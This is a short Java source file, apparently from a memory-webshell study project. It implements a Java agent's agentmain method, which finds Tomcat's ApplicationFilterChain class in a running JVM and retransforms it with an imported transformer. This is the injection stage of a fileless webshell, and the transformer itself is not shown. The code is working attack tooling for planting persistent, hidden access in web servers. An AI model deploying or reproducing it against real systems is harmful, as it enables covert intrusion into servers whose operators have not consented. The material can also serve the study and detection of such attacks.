package com.madaha.codesecmemshell.javaAgent;

import com.madaha.codesecmemshell.javaAgent.ApplicationFilterChain_Transform_Filter;

import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;


public class Java_Agent_agentmain_Instrumentation_Transformer {
    public static void agentmain(String args, Instrumentation inst) throws InterruptedException, UnmodifiableClassException {
        Class[] classes = inst.getAllLoadedClasses();

        // 获取目标JVM加载的全部类
        for (Class cls : classes){
            if (cls.getName().equals("org.apache.catalina.core.ApplicationFilterChain")){

                // 添加一个transformer到Instrumentation，并重新触发目标类加载
                inst.addTransformer(new ApplicationFilterChain_Transform_Filter(), true);
                inst.retransformClasses(cls);
            }
        }
    }
}
